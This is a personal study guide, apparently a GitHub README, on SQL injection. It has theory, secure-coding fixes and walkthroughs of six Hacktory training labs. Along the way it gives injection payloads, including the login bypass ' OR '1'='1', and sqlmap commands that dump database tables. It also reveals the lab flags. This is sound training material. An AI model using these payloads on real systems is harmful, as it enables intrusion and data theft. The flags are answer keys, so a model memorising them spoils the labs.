# SQL Injection

## Theory

### What is SQL Injection?

**SQL Injection** is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. By manipulating SQL queries, an attacker can:

- Bypass authentication and impersonate users  
- Access sensitive data (user info, payment data, etc.)  
- Modify or delete data  
- Launch attacks on the internal network protected by a firewall  

It is considered one of the **most critical** security vulnerabilities.

---

### Example: How SQL Injection Looks

Suppose we have a `Users` table and a script that retrieves a username by `userId`:

```java
String sqlQuery = "SELECT username FROM Users WHERE userId=" + req.getParameter("id");
Statement stmt = conn.createStatement();
ResultSet res = stmt.executeQuery(sqlQuery);
```

If we call:  
```
http://www.hacktory.lab/getUsernameById?id=1
```

The query executed will be:
```sql
SELECT username FROM Users WHERE userId=1
```

Output: **Bob**

![image](https://github.com/user-attachments/assets/67464031-7b35-4d9e-83aa-aaba20e17346)

---

## Exploitation Techniques

### 1. UNION-Based Injection

To combine results from different tables using the `UNION` operator, the number of columns in both queries must match.

#### 🔍 Finding the Number of Columns

**Method 1: Try Adding Columns**

```sql
?id=1 UNION SELECT 1          -- ❌ Error  
?id=1 UNION SELECT 1,2        -- ❌ Error  
?id=1 UNION SELECT 1,2,3      -- ✅ No error → 3 columns
```

**Method 2: Use GROUP BY**

```sql
?id=1 GROUP BY 2              -- ❌ Error  
?id=1 GROUP BY 5              -- ❌ Error  
?id=1 GROUP BY 3              -- ✅ No error → 3 columns
```

---

### 2. Boolean-Based Injection

Evaluate true/false logic in SQL and observe the application's response.

#### Example: Login Bypass

```java
String.format("SELECT * FROM users WHERE name='%s' and password='%s'", name, password);
```

Injected Input:

```java
name = "1' OR '1'='1'; --"
password = "1"
```

Final Query:

```sql
SELECT * FROM users WHERE name='1' OR '1'='1'; --' AND password='1'
```

---

### 3. Time-Based Injection

This technique measures response delay to infer conditions.

#### Example

Original Query:

```sql
SELECT login FROM users WHERE id='$_GET['id']';
```

Injected Input:

```sql
1' AND IF(MID(VERSION(),1,1) = '5', SLEEP(15), 0) --
```

Executed Query:

```sql
SELECT login FROM users WHERE id='1' AND IF(MID(VERSION(),1,1) = '5', SLEEP(15), 0) -- ';
```

If the condition is true, the server delays for 15 seconds — indicating successful injection.

---

### 4. Stacked Queries (MSSQL)

Allows executing multiple queries separated by semicolons.

#### Example

```sql
SELECT login FROM users WHERE id='$_GET['id']';
```

Injected Input:

```sql
1'; SELECT password FROM users WHERE id='1
```

Executed:

```sql
SELECT login FROM users WHERE id='1'; SELECT password FROM users WHERE id='1';
```

---

### 5. Error-Based Injection

Leaks data through verbose error messages.

#### Example

```sql
SELECT name, email FROM users WHERE id='1' AND extractvalue(rand(), concat(0x3a, version())) -- 
```

The error will include the database version.

---

### 6. Cookie-Based Blind Injection Example

A vulnerable app stores user data in a cookie that is later used in SQL queries.

#### Example Request (captured via Burp Suite):

```
POST / HTTP/1.1
Host: www.hacktory.lab
Cookie: PHPSESSID=eb4k51cftnulvdksn5n12jcllc; name=Alex1234
Content-Type: application/x-www-form-urlencoded

message=Hi+there
```

The `name` cookie parameter is vulnerable to SQL injection.

---

### Using SQLMap to Exploit

Run SQLMap:

```bash
sqlmap --url "http://www.hacktory.lab/" --cookie="name=*" --dbs
```

- `--cookie="name=*"`: Inject into the `name` parameter
- `--dbs`: List databases

**Output:**

```
available databases [2]:
[*] comments
[*] information_schema
```

Next, enumerate tables in `comments`:

```bash
sqlmap --url "http://www.hacktory.lab/" --cookie="name=*" -D comments --tables
```

**Output:**

```
[2 tables]
+--------------+
| secret_files |
| posts        |
+--------------+
```

Extract data:

```bash
sqlmap --url "http://www.hacktory.lab/" --cookie="name=*" --batch -D comments -T secret_files --sql-shell
```

And in the SQL shell:

```sql
SELECT * FROM secret_files;
```

✅ Success: Sensitive data is extracted using a blind injection on the cookie parameter.

---

## Fixes and Prevention

### Primary Measures

- Use **prepared statements** and **parameterized queries**.
- Prefer **ORMs (Object-Relational Mappers)**.
- Use **built-in framework query functions**.

#### ❌ Vulnerable Example:

```java
String sqlQuery = String.format("SELECT username FROM Users WHERE userId='%s'", req.getParameter("id"));
Statement stmt = conn.createStatement();
ResultSet res = stmt.executeQuery(sqlQuery);
```

#### ✅ Fixed with Prepared Statements:

```java
String query = "SELECT username FROM Users WHERE userId = ?";
PreparedStatement stmt = conn.prepareStatement(query);
stmt.setString(1, req.getParameter("id"));
ResultSet rs = stmt.executeQuery();
```

### Additional Recommendations

- Apply the **Principle of Least Privilege** on database accounts.
- Use **input validation** with whitelisting wherever possible.
- Sanitize and encode all user-supplied input.
- Use **Web Application Firewalls (WAFs)** to catch injection attempts.

---

> ✅ **Always validate, sanitize, and never trust user input.**

## LAB1:Bully
- Open the machine
- Open the firfox
- Test the login admin admin
- see the answer in the burb
- we can see the input is direclty in the sql
- inject this ' OR '1'='1' -- 
 see the flag save it and save note s
goood luck

## LAB2:Bully
- open the machine
- open the editor
- we need to search wheer is the problem
- saerch for somthing like this `String query = String.format( "select login from users where login='%s' and passwd='%s'", (String)req.getParameter("login"),(String)req.getParameter("password"));`
- you need to fix it using the PreparedStatement check the teory
- after running you will find the flag
- the flag is JAVA_SQLINJECTION_STUDENT
- good luck

## Lab3 4F1ng3r Discount
Let's have fun with promocodes. You have to find a 100% discount promocode. We will identify the database version and work with it.

````markdown
## Task
Find the 100% promo code, apply it, make an order, and get the flag.
## Steps
1. Go to `http://www.hacktory.lab` and open the promo code page.
2. Intercept the promo code POST request (parameter: `promocode`) using **Burp Suite**.
3. Confirm SQL injection on `promocode` using **sqlmap**:  
   ```bash
   sqlmap --url "http://www.hacktory.lab/checkpromo" --data "promocode=SUMMER2025" --batch --dbs
````
4. Enumerate the database and tables:
   ```bash
   sqlmap --url "http://www.hacktory.lab/checkpromo" --data "promocode=SUMMER2025" -D shop --tables --batch
   ```
5. Get columns of the `promo` table:
   ```bash
   sqlmap --url "http://www.hacktory.lab/checkpromo" --data "promocode=SUMMER2025" -D shop -T promo --columns --batch
   ```
6. Dump all promo codes and modifiers:
   ```bash
   sqlmap --url "http://www.hacktory.lab/checkpromo" --data "promocode=SUMMER2025" -D shop -T promo --dump --batch
   ```
7. Find the promo code with `modifier = 100` (100% discount).
8. Apply the 100% promo code on the website to make an order.
9. Receive the flag in the response:
   ```
   not_easy_sql_injection
   ```
---
Perfect! Here's your write-up formatted as a proper GitHub `README.md` file for Lab 4 (`LAB4:4F1ng3r Discount`):

---

# LAB4: 4F1ng3r Discount 🛒💥  
**Protect the store so that nobody could get access to promocodes through vulnerabilities.**

## 🧠 Goal
Secure the online shop application from SQL injection attacks and retrieve the final flag after patching the vulnerabilities.

---

## 🔨 Steps

### 🖥️ 1. Open the VM and Launch Code Editor
- Navigate to the project source.
- Review all files, especially `Checkpromo.java` and `Checkout.java`.

---

### 🔍 2. Vulnerability Analysis

#### 🔓 Found Vulnerability in `Checkpromo.java`:
```java
String promoCode = (String)req.getParameter("promocode");
String query = String.format("SELECT modifier FROM `promo` WHERE `promo`='%s' LIMIT 1", promoCode);
rs = stmt.executeQuery(query);
````

* ❌ **Problem:** Raw string concatenation → **SQL Injection**
* ✅ **Fix:** Use `PreparedStatement` to securely parameterize inputs.

#### 🔓 Found Second Vulnerability in `Checkout.java`:

```java
rs = stmt.executeQuery("select modifier from promo where promo='" + promoCode + "'");
```

* ❌ Same injection vulnerability.
* ✅ Replaced with `PreparedStatement`.

---

### ✅ 3. Secure Code Fixes

**☑️ Updated both files using `PreparedStatement`**
No logic was changed—only SQL queries were secured.

---

### 🚀 4. Deployment

* Build the project.
* Redeploy on the local server.
* Use the “Test your code” button from the bot interface.

---

## 🎉 Result

After successfully testing the patched code, the flag is revealed:

```text
✅ FLAG: JAVA_SQLINJECTION_SHOP_HELPER
```

---

## ✍️ Notes

>  by **Kader** identifying and fixing both SQL injection vulnerabilities in `Checkpromo` and `Checkout`.

---

# 🔐 LAB5: Sqill – SQL Injection Challenge

You have to find a couple vulnerabilities to prove your Skill! Find a secret string hidden deeply in this application and find out how to read private articles.


---

## 🧭 Lab Walkthrough

### 1. 🎯 Initial Steps

- Open the target machine.
- Open the browser and explore the site.
- Analyze the behavior — based on the hint: **"check the `id`"** parameter.
- Open **Burp Suite** and intercept the requests.
- Using Intruder, test IDs from `1` to `100` and check for HTTP `200 OK` responses.
  - ✅ Multiple `200` responses suggest valid resource paths.

---

### 2. 🛠️ Using SQLMap

We now move to terminal to automate further exploitation using `sqlmap`.

#### 🔍 Detect Injection Point

```bash
sqlmap -u "http://10.0.2.10/note/1*" --batch --level=1 --risk=1
````

* SQLMap detects **two injection techniques**:

  * ✅ Boolean-based blind
  * ✅ AND/OR time-based blind

#### 📢 Grab the DBMS Banner

```bash
sqlmap -u "http://10.0.2.10/note/1*" --batch --banner
```

* Result:

  * DBMS: `MariaDB 10.3.22`
  * Web server: `nginx/1.14.2`

---

### 3. 📂 Database Enumeration

#### 🧾 List All Databases

```bash
sqlmap -u "http://10.0.2.10/note/1*" --batch --dbs
```

* Databases Found:

  * `information_schema`
  * `notes`

#### 📚 List Tables in `notes`

```bash
sqlmap -u "http://10.0.2.10/note/1*" --batch -D notes --tables
```

* Tables Found:

  * `user`
  * `note`
  * `secret`
  * and others...

#### 📌 Check `secret` Table Columns

```bash
sqlmap -u "http://10.0.2.10/note/1*" --batch -D notes -T secret --columns
```

* Column found: `flag`

---

### 4. 🏁 Dump the Flag

```bash
sqlmap -u "http://10.0.2.10/note/1*" --batch -D notes -T secret -C flag --dump
```

* ✅ Flag extracted: `Yt_an0The_SQL`

---

## 📓 Notes

* 💡 Use Burp to explore hidden behaviors before running automated tools.
* ✅ Always identify valid paths and injection types manually first.
* 🎯 SQLMap is powerful, but only if you understand the target's structure.
* 🔐 Flag captured: `Yt_an0The_SQL`

---

---
# 🔐 LAB6: Sqill – fixing:

- Open the machine  
- Open the code editor  
- Search in the source code  
- Find the part where `id` is used in a SQL query  

## Original Vulnerable Code

```java
// Vulnerable code: concatenating user input directly into SQL query

Query query = entityManager.createNativeQuery(
    "SELECT a.id, a.user_id, a.public, a.title, " +
    "       a.text, a.date_created, a.date_updated " +
    "FROM note AS a " +
    "WHERE a.id=" + id
);
````

## Fixed Code

```java
// Safe code: using parameterized queries or service methods

Note note = noteService.getById(id);
```

* Deploy your fixed code
* Test your code
* The flag is **JAVA\_SQL\_NoT3s**






```
## ✅ Good luck from Kader!

```




